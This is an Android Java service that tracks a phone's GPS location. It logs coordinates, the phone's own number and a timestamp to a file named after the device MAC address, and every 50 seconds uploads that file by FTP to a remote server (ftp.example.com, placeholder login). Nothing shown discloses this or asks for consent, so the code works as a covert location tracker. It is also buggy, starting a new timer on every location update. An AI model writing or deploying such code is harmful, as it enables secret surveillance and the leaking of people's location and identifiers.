package com.emre.gps;

import android.app.*;
import android.content.*;
import android.location.*;
import android.net.wifi.*;
import android.os.*;
import android.telephony.*;
import android.util.*;
import android.widget.*;
import java.io.*;
import java.text.*;
import java.util.*;
import org.apache.commons.net.ftp.*;


public class LocationService extends Service 
{
	public static final String BROADCAST_ACTION = "Hello World";
	private static final int TWO_MINUTES = 1000 * 60 * 2;
	public LocationManager locationManager;
	public MyLocationListener listener;
	public Location previousBestLocation = null;

	Intent intent;
	int counter = 0;
	
	

	String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
	
	
	
	public void UploadIt(){


		WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		WifiInfo info = manager.getConnectionInfo();
		String macaddress = info.getMacAddress();
		


        org.apache.commons.net.ftp.FTPClient con = null;

        try
        {
            con = new FTPClient();
            con.connect("ftp.example.com");  //enter your ftp info

            if (con.login("username", "password"))
            {
				
                con.enterLocalPassiveMode(); 
                con.setFileType(FTP.BINARY_FILE_TYPE);
                String data = "/data/data/com.emre.gps/files/"+macaddress;

                FileInputStream in = new FileInputStream(new File(data));
//--------------------------------------------------------------------------------------------upload--------------------------------------------------------------------------------------------------


                boolean result = con.storeFile("/"+macaddress, in);
                in.close();
                if (result) Log.v("upload result", "succeeded");
                con.logout();
                con.disconnect();
            }
        }
        catch (Exception e)
        {

            e.printStackTrace();



        }

    }
	

    @Override
    public void onCreate() 
    {
        super.onCreate();
        intent = new Intent(BROADCAST_ACTION);      
    }

    @Override
    public void onStart(Intent intent, int startId) 
    {      
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        listener = new MyLocationListener();        
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 4000, 0, listener);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 4000, 0, listener);
    }

    @Override
    public IBinder onBind(Intent intent) 
    {
        return null;
    }

    protected boolean isBetterLocation(Location location, Location currentBestLocation) {
        if (currentBestLocation == null) {
            
            return true;
        }


        long timeDelta = location.getTime() - currentBestLocation.getTime();
        boolean isSignificantlyNewer = timeDelta > TWO_MINUTES;
        boolean isSignificantlyOlder = timeDelta < -TWO_MINUTES;
        boolean isNewer = timeDelta > 0;

        if (isSignificantlyNewer) {
            return true;
			
        } else if (isSignificantlyOlder) {
            return false;
        }

        
        int accuracyDelta = (int) (location.getAccuracy() - currentBestLocation.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0;
        boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200;

        
        boolean isFromSameProvider = isSameProvider(location.getProvider(),
													currentBestLocation.getProvider());

        
        if (isMoreAccurate) {
            return true;
        } else if (isNewer && !isLessAccurate) {
            return true;
        } else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) {
            return true;
        }
        return false;
    }



	
    private boolean isSameProvider(String provider1, String provider2) {
        if (provider1 == null) {
			return provider2 == null;
        }
        return provider1.equals(provider2);
    }



	@Override
    public void onDestroy() {       
		
        super.onDestroy();
        Log.v("STOP_SERVICE", "DONE");
        locationManager.removeUpdates(listener);        
    }   

    public static Thread performOnBackgroundThread(final Runnable runnable) {
        final Thread t = new Thread() {
            @Override
            public void run() {
                try {
                    runnable.run();
                } finally {

                }
            }
        };
        t.start();
        return t;
    }




	public class MyLocationListener implements LocationListener
    {
		public void sendMail(String adress, String baslik, String mesaj){
			
			Intent i = new Intent(Intent.ACTION_SEND);
			i.setType("message/rfc822");
			i.putExtra(Intent.EXTRA_EMAIL  , new String[]{adress});
			i.putExtra(Intent.EXTRA_SUBJECT, baslik);
			i.putExtra(Intent.EXTRA_TEXT   , mesaj);
			try {
				startActivity(Intent.createChooser(i, "Send mail..."));
			} catch (android.content.ActivityNotFoundException ex) {
				Toast.makeText( getApplicationContext(), "Error", Toast.LENGTH_SHORT ).show();
			}
			
			
		}

        public void onLocationChanged(final Location loc)
        {
            
			TelephonyManager phoneManager = (TelephonyManager) 
				getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
			final String phoneNumber = phoneManager.getLine1Number();

			WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
			WifiInfo info = manager.getConnectionInfo();
			final String macaddress = info.getMacAddress();
			
			
			
			Timer timer = new Timer();
			timer.scheduleAtFixedRate(new TimerTask() {
					@Override
					public void run() {
						
						if(isBetterLocation(loc, previousBestLocation)) {
							loc.getLatitude();
							loc.getLongitude();             
							intent.putExtra("Latitude", loc.getLatitude());
							intent.putExtra("Longitude", loc.getLongitude());     
							intent.putExtra("Provider", loc.getProvider());                 
							sendBroadcast(intent);          

							String konum1 = String.valueOf(loc.getLatitude());

							String konum2 = String.valueOf(loc.getLongitude());

							String tumkonum = "Number: " + phoneNumber+ " " + currentDateTimeString + " " + konum1 + " , " + konum2 + "\n";
							File dosya = new File("/data/data/com.emre.gps/files/"+macaddress);
							boolean var_dosya = dosya.exists();
							String alt = "\n";


							if (var_dosya==false){



								try {


									FileOutputStream fileOutputStream = openFileOutput(macaddress, Context.MODE_PRIVATE);

									fileOutputStream.write(alt.toString().getBytes());
									fileOutputStream.write(tumkonum.toString().getBytes());

									fileOutputStream.flush();
									fileOutputStream.close();
								} catch (Exception e) {
									Log.e("Bir Hata oluştu", "Hata");
								}

							}else{



								try {


									FileOutputStream fileOutputStream = openFileOutput(macaddress, Context.MODE_APPEND);

									fileOutputStream.write(alt.toString().getBytes());
									fileOutputStream.write(tumkonum.toString().getBytes());

									fileOutputStream.flush();
									fileOutputStream.close();
								} catch (Exception e) {
									Log.e("Bir Hata oluştu", "Hata");
								}






							}






							new Thread (new Runnable() {
									public void run(){
										UploadIt();

									}
								}).start();

						}
						

					}
				}, 0, 50000);
			
                                          
			
			
			
        }

        public void onProviderDisabled(String provider)
        {
            Toast.makeText( getApplicationContext(), "OPEN GPS PLEASE", Toast.LENGTH_SHORT ).show();
        }


        public void onProviderEnabled(String provider)
        {
            Toast.makeText( getApplicationContext(), "Gps Enabled", Toast.LENGTH_SHORT).show();
        }


        public void onStatusChanged(String provider, int status, Bundle extras)
        {

        }

    }
}
